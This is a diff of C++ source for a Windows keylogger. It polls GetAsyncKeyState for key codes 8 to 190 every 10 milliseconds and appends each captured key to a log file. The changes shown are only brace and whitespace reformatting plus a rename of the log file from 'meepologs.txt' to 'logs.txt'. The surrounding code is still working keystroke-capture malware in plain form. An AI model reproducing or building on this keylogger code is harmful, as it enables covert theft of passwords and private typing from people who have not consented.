@@ -7,14 +7,16 @@
 
 using namespace std;
 
-void WriteLog(LPCSTR logs) {
+void WriteLog(LPCSTR logs) 
+{
 	ofstream outfile; 
 	outfile.open("logs.txt", ofstream::app); 
-	outfile << logs; 
+	outfile << logs;
 	outfile.close(); 
 }
 
-bool KeyIsListed(int iGetKey) {
+bool KeyIsListed(int iGetKey) 
+{
 	switch (iGetKey)
 	{
 	case VK_RBUTTON:
@@ -52,16 +54,19 @@ int main()
 		Sleep(10); 
 		for (key = 8; key <= 190; key++) 
 		{
-			if (GetAsyncKeyState(key) == -32767) {
+			if (GetAsyncKeyState(key) == -32767) 
+			{
 				if (KeyIsListed(key) == FALSE)
 				{
 					cout << key; 
 					ofstream outfile; 
-					outfile.open("meepologs.txt", ofstream::app);
+					outfile.open("logs.txt", ofstream::app);
 					outfile << key;
 					outfile.close();
 				}
-				else {
+				else 
+				{
+				
 				}
 			}
 		}
